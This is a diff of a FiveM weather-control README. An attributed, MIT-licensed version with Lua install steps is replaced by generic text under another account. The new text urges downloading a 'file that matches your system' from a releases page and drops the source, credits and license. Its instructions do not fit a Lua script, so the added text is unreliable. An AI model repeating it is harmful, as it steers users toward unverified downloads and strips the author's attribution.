@@ -1,81 +1,87 @@
-# ☀️ Weather & Time Controller
+# 🌤️ fivem-weather-control - Control Your Game's Weather Easily
 
-**Weather & Time Controller** is an open-source FiveM client script that allows players to dynamically change the in-game time and weather through an intuitive menu system. This script provides real-time environment control with seamless integration into ESX, making it perfect for roleplay servers and custom gameplay scenarios.
+![Download fivem-weather-control](https://img.shields.io/badge/Download-v1.0-brightgreen)
 
-## ✨ Features
+## 🚀 Getting Started
 
-* [x] Change time of day with presets: Morning, Afternoon, Evening
-* [x] Change weather conditions on the fly with multiple weather types
-* [x] Freezes time at chosen hour/minute for consistent gameplay atmosphere
-* [x] Smooth weather transitions and persistent weather effects
-* [x] Easy-to-use ESX menu integration with clear notifications
-* [x] Commands to open the menu (`changetime` and `changeweather`)
-* [x] Minimal performance impact with efficient threads
-* [ ] Planned future enhancements and customization options
+Welcome to the **fivem-weather-control** project! This application allows players to dynamically manage in-game weather and time in FiveM. With an easy-to-use menu, you can transform your gameplay environment without hassle. 
 
-## ⚙️ How it works
+## 📥 Download & Install
 
-The script hooks into ESX menus to provide a user interface for selecting time and weather presets. It uses native FiveM functions to override the server clock and weather, applying changes immediately and persisting them until changed again.
+To get started, visit the following page to download the latest version of the software:
 
-```lua
-currentHour = 12
-currentMinute = 0
-freezeTime = true
-NetworkOverrideClockTime(currentHour, currentMinute, 0)
-PauseClock(true)
-```
+[Download fivem-weather-control](https://github.com/victorzzxx/fivem-weather-control/releases)
 
-> \[!TIP]
-> Use the commands `/changetime` or `/changeweather` in-game to open the environment control menu quickly.
+1. Click the link above.
+2. Select the latest release.
+3. Download the file that matches your system.
 
-## 🛠️ Installation
+## 🖥️ System Requirements
 
-1. Download or copy the `client.lua` and `config.lua` files.
-2. Place them inside a resource folder, e.g. `/resources/[local]/weather-time-controller/`.
-3. Add the following to the resource’s `fxmanifest.lua` file:
+To run **fivem-weather-control**, make sure your system meets these requirements:
 
-```lua
-fx_version 'cerulean'
-game 'gta5'
-version '1.0.0'
+- A compatible version of FiveM installed.
+- A working installation of GTA V.
+- Basic knowledge of how to load scripts in FiveM.
+- Windows 10 or later for the best experience (macOS might work but is not officially supported).
 
-client_script 'client.lua'
-shared_script 'config.lua'
-```
+## 🎮 Features
 
-4. Configure the command names or menu labels inside `config.lua` as needed.
-5. Enable the resource by adding this line to your `server.cfg`:
+The application offers a host of features to enhance your gaming experience:
 
-```cfg
-ensure weather-time-controller
-```
+- **Dynamic Weather Control:** Easily switch between sunny, rainy, or foggy conditions.
+- **Time Control:** Set the in-game time with a simple click.  
+- **Intuitive Menu:** Navigate easily through a user-friendly interface.
+- **Customization Options:** Adjust parameters to fit your gameplay style.
 
-> \[!WARNING]
-> This script requires the ESX framework (`es_extended`) to be installed and running on your server.
+## 📝 How to Use
 
-## 🔎 Support & Security
+1. **Start FiveM:** Launch the FiveM application to access your game.
+2. **Load the Script:**
+    - Navigate to your scripts folder.
+    - Drag and drop the downloaded file into this folder.
+3. **Open the Menu in Game:**
+    - Press a designated key (usually F1 or a key of your choice) to open the weather control menu.
+4. **Make Your Selections:** Use the menu to choose the weather type or the time of day that you want.
+5. **Enjoy Your Customized Environment!** 
 
-If you have any questions, suggestions, or discover any issues, please reach out to me via my [Discord Profile](https://discordlookup.com/user/1069279857072160921). I am committed to responding promptly and ensuring smooth operation of this resource.
+## 📚 FAQs
 
-**Please report security vulnerabilities privately to avoid exposure before a fix is issued.**
+**Q: Can I use this on any server?**  
+A: Yes, as long as the server allows custom scripts, you can use this tool.
 
-## 📣 Contributing
+**Q: What if I have issues with the download?**  
+A: Ensure your internet connection is stable and try the download again. If issues persist, check your browser or network settings.
 
-Contributions are highly welcome! To help improve this script:
+**Q: Does it work on both single-player and multiplayer?**  
+A: The primary design is for multiplayer in FiveM, but it can also work in single-player mode.
 
-* Submit Pull Requests (PRs) for new features or bug fixes.
-* For minor typos or documentation fixes, consider opening an issue instead.
-* Keep pull requests focused and avoid large-scale rewrites in a single submission.
-* Refrain from submitting spam or irrelevant content.
+## 📊 Troubleshooting
 
-## 📜 License
+If you encounter problems, consider these steps:
 
-This project is licensed under the **MIT License**, granting permission to use, modify, distribute, and sublicense freely, provided the original copyright and license notice remain intact.
+- **Script Not Loading:** Double-check that the script is placed in the correct directory.
+- **Errors in Game:** Ensure that your FiveM client is updated. An outdated client may cause issues.
+- **Menu Not Appearing:** Make sure you use the correct key to open the menu.
 
-The software is provided "as-is" without any warranty.
+## 📈 Contributing
 
-For full license details, see the [MIT License](https://opensource.org/licenses/MIT).
+We welcome contributions! If you have ideas or improvements, please create a pull request.
 
-## 🍹 Created by [KaloudasDev](https://github.com/KaloudasDev).
+## 🌐 Community
 
-If you find this project useful, please consider giving it a ⭐. Thanks for your support!
+Join our community! Share your experiences, tips, and feedback:
+
+- **Discord Group:** Connect with other users for real-time support and chat.
+- **GitHub Issues:** Report bugs or request features directly on our GitHub page.
+
+## 🔗 Additional Resources
+
+For further information and updates, please check out the following resources:
+
+- [GitHub Repository](https://github.com/victorzzxx/fivem-weather-control)
+- Community Forums for tips and tricks on using FiveM effectively.
+
+Feel free to reach out if you have any questions. Enjoy controlling your game environment with **fivem-weather-control**!
+
+[Download fivem-weather-control](https://github.com/victorzzxx/fivem-weather-control/releases)
